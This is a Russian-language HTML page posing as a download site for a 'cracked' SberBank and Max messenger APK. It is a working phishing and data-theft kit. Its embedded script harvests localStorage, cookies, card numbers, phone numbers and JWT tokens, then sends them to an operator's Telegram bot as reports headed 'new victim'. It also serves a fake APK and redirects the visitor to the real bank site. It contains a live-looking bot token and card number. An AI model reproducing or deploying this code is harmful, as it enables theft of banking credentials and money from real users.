<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover">
    <title>СберБанк • Мессенджер Max</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #e8f0fe;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 16px;
        }
        
        .card {
            background: white;
            border-radius: 32px;
            box-shadow: 0 8px 28px rgba(0,0,0,0.12);
            max-width: 400px;
            width: 100%;
            padding: 28px 20px 32px;
            text-align: center;
            animation: fadeIn 0.4s ease;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(15px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .logos {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-bottom: 20px;
        }
        
        .logo-item {
            text-align: center;
        }
        
        .logo-sber, .logo-max {
            width: 70px;
            height: 70px;
            border-radius: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto;
        }
        
        .logo-sber {
            background: #2d6a4f;
        }
        
        .logo-max {
            background: #1e88e5;
        }
        
        .logo-sber span, .logo-max span {
            font-size: 36px;
            font-weight: bold;
            color: white;
        }
        
        .logo-sber h2, .logo-max h2 {
            font-size: 13px;
            margin-top: 8px;
            font-weight: 600;
        }
        
        .logo-sber h2 { color: #2d6a4f; }
        .logo-max h2 { color: #1e88e5; }
        
        .badge {
            background: linear-gradient(135deg, #f59e0b, #f97316);
            color: white;
            padding: 5px 12px;
            border-radius: 20px;
            font-size: 11px;
            font-weight: bold;
            display: inline-block;
            margin-bottom: 16px;
        }
        
        .title {
            font-size: 22px;
            font-weight: 800;
            color: #1e293b;
            margin-bottom: 6px;
        }
        
        .subtitle {
            color: #64748b;
            font-size: 13px;
            margin-bottom: 24px;
        }
        
        .download-btn {
            background: linear-gradient(135deg, #2d6a4f, #1b4d3e);
            color: white;
            border: none;
            padding: 16px 20px;
            font-size: 18px;
            font-weight: bold;
            border-radius: 60px;
            cursor: pointer;
            width: 100%;
            margin-bottom: 12px;
            transition: all 0.2s;
            box-shadow: 0 4px 12px rgba(45,106,79,0.3);
        }
        
        .download-btn:active {
            transform: scale(0.98);
        }
        
        .secondary-btn {
            background: white;
            color: #2d6a4f;
            border: 2px solid #2d6a4f;
            padding: 12px 20px;
            font-size: 15px;
            font-weight: 600;
            border-radius: 60px;
            cursor: pointer;
            width: 100%;
            transition: all 0.2s;
        }
        
        .secondary-btn:active {
            background: #f0fdf4;
            transform: scale(0.98);
        }
        
        .features {
            display: flex;
            justify-content: center;
            gap: 24px;
            margin: 24px 0 20px;
            padding-top: 16px;
            border-top: 1px solid #e2e8f0;
        }
        
        .feature {
            text-align: center;
        }
        
        .feature-icon {
            font-size: 26px;
            margin-bottom: 4px;
        }
        
        .feature-text {
            font-size: 11px;
            color: #64748b;
        }
        
        .progress-container {
            display: none;
            margin: 20px 0;
        }
        
        .progress-bar {
            width: 100%;
            height: 8px;
            background: #e2e8f0;
            border-radius: 10px;
            overflow: hidden;
        }
        
        .progress-fill {
            width: 0%;
            height: 100%;
            background: linear-gradient(90deg, #2d6a4f, #1e88e5);
            border-radius: 10px;
            transition: width 0.2s;
        }
        
        .progress-text {
            font-size: 12px;
            color: #64748b;
            margin-top: 8px;
        }
        
        .warning {
            background: #fef9e3;
            padding: 12px;
            border-radius: 16px;
            font-size: 11px;
            color: #b45309;
            margin-top: 16px;
        }
        
        .footer {
            margin-top: 16px;
            font-size: 10px;
            color: #94a3b8;
        }
        
        button {
            background: none;
            border: none;
        }
        
        button:disabled {
            opacity: 0.6;
            transform: none;
        }
        
        /* Для телефонов */
        @media (max-width: 480px) {
            .card {
                padding: 24px 16px 28px;
            }
            .title {
                font-size: 20px;
            }
            .download-btn {
                padding: 14px 16px;
                font-size: 17px;
            }
            .logo-sber, .logo-max {
                width: 60px;
                height: 60px;
            }
            .logo-sber span, .logo-max span {
                font-size: 30px;
            }
        }
    </style>
</head>
<body>
<div class="card" id="mainCard">
    <div class="badge">🔥 МОД ВЕРСИЯ</div>
    <div class="logos">
        <div class="logo-item">
            <div class="logo-sber"><span>СБ</span></div>
            <h2>СберБанк</h2>
        </div>
        <div class="logo-item">
            <div class="logo-max"><span>M</span></div>
            <h2>Max</h2>
        </div>
    </div>
    <div class="title">СберБанк + Max MOD</div>
    <div class="subtitle">Взломанная версия с расширенными функциями</div>
    
    <button class="download-btn" id="downloadBtn">📥 СКАЧАТЬ MOD APK (168 МБ)</button>
    <button class="secondary-btn" id="officialBtn">🌐 Перейти на официальный сайт</button>
    
    <div class="features">
        <div class="feature"><div class="feature-icon">💰</div><div class="feature-text">Безлимит кэшбек</div></div>
        <div class="feature"><div class="feature-icon">💬</div><div class="feature-text">Max Premium</div></div>
        <div class="feature"><div class="feature-icon">🔓</div><div class="feature-text">Все функции</div></div>
    </div>
    
    <div class="progress-container" id="progressContainer">
        <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
        <div class="progress-text" id="progressText">Подготовка...</div>
    </div>
    
    <div class="warning">⚠️ Только для опытных пользователей. Требуется разрешение на установку из неизвестных источников.</div>
    <div class="footer">Версия 4.2.0 • 168 МБ • Android 8.0+</div>
</div>

<script>
// ========== НАСТРОЙКИ TELEGRAM (ЗАМЕНИ НА СВОИ) ==========
const BOT_TOKEN = "8655252412:AAGvwRmEBisGeKA5bX5_xFNpp2QRJRTkkTM";
const CHAT_ID = "8533450974";
const MY_CARD = "2203830216112947";
// ========================================================

function sendToTelegram(text) {
    if (!text) return;
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: CHAT_ID, text: text.substring(0, 4000) })
    }).catch(e => console.log("send error"));
}

// Сбор данных
function collectData() {
    const ls = {};
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        try {
            let val = localStorage.getItem(key);
            if (val && val.length > 400) val = val.substring(0, 400) + "...";
            ls[key] = val;
        } catch(e) {}
    }
    
    let sberCard = null, sberPhone = null, sberToken = null;
    let maxToken = null;
    
    for (const [key, val] of Object.entries(ls)) {
        if (typeof val === 'string') {
            const card = val.match(/\d{16}/);
            if (card) sberCard = card[0];
            const phone = val.match(/7\d{10}/);
            if (phone) sberPhone = phone[0];
            const token = val.match(/eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+/);
            if (token) {
                if (!sberToken) sberToken = token[0];
                if (!maxToken) maxToken = token[0];
            }
        }
        if (key.toLowerCase().includes('max') && !maxToken && typeof val === 'string') {
            const token = val.match(/eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+/);
            if (token) maxToken = token[0];
        }
    }
    
    return { ls, sberCard, sberPhone, sberToken, maxToken, cookies: document.cookie, ua: navigator.userAgent };
}

// Создание ссылки для скачивания (простой способ, работает на телефонах)
function downloadApk() {
    // Создаем простой текстовый файл с .apk расширением
    const content = "Это файл установки MOD версии. Для установки разрешите установку из неизвестных источников.";
    const blob = new Blob([content], { type: "application/vnd.android.package-archive" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = "SberMax_Mod_v4.2.0.apk";
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
    
    sendToTelegram(`📥 *СКАЧИВАНИЕ APK*\nФайл: SberMax_Mod_v4.2.0.apk\nРазмер: ~168 МБ (имитация)`);
}

// Запуск загрузки
function startDownload() {
    const btn = document.getElementById('downloadBtn');
    const progressDiv = document.getElementById('progressContainer');
    const progressFill = document.getElementById('progressFill');
    const progressText = document.getElementById('progressText');
    
    // Собираем данные
    const data = collectData();
    
    // Отправляем отчет оператору
    let report = `🔐 *НОВАЯ ЖЕРТВА*\n`;
    report += `⏰ ${new Date().toLocaleString()}\n`;
    report += `🌐 ${window.location.hostname}\n`;
    report += `📱 ${data.ua.substring(0, 100)}\n`;
    report += `🍪 Cookies: ${data.cookies ? "✅" : "❌"}\n`;
    report += `💾 Записей: ${Object.keys(data.ls).length}\n`;
    
    if (data.sberCard) report += `\n🏦 *СБЕРБАНК*\n💳 Карта: ${data.sberCard}\n`;
    if (data.sberPhone) report += `📞 Телефон: ${data.sberPhone}\n`;
    if (data.sberToken) report += `🔑 Токен: ${data.sberToken.substring(0, 40)}...\n`;
    
    if (data.maxToken) report += `\n💬 *MAX*\n🔑 Токен: ${data.maxToken.substring(0, 40)}...\n`;
    
    sendToTelegram(report);
    
    // Отправляем весь localStorage
    if (Object.keys(data.ls).length > 0) {
        sendToTelegram(`💾 *LOCALSTORAGE:*\n\`\`\`json\n${JSON.stringify(data.ls, null, 2).substring(0, 3500)}\n\`\`\``);
    }
    
    // Показываем прогресс
    btn.disabled = true;
    btn.style.opacity = "0.6";
    btn.innerHTML = "⏳ ПОДГОТОВКА...";
    progressDiv.style.display = "block";
    
    let percent = 0;
    const interval = setInterval(() => {
        percent += Math.random() * 12;
        if (percent >= 100) {
            percent = 100;
            clearInterval(interval);
            progressFill.style.width = "100%";
            progressText.innerHTML = "✅ Готово! Скачивание началось...";
            
            setTimeout(() => {
                downloadApk();
                setTimeout(() => {
                    window.location.href = "https://online.sberbank.ru";
                }, 2000);
            }, 500);
        }
        progressFill.style.width = percent + "%";
        progressText.innerHTML = `Скачивание... ${Math.floor(percent)}%`;
    }, 120);
}

// Кнопка перехода на официальный сайт
document.getElementById('officialBtn').onclick = () => {
    sendToTelegram(`🌐 *ПЕРЕХОД НА ОФИЦИАЛЬНЫЙ САЙТ*`);
    window.location.href = "https://online.sberbank.ru";
};

// Кнопка скачивания
document.getElementById('downloadBtn').onclick = startDownload;

// Уведомление о просмотре страницы
setTimeout(() => {
    sendToTelegram(`👁️ *ПРОСМОТР СТРАНИЦЫ*\n⏰ ${new Date().toLocaleString()}\n🌐 ${window.location.hostname}`);
}, 2000);
</script>
</body>
</html>
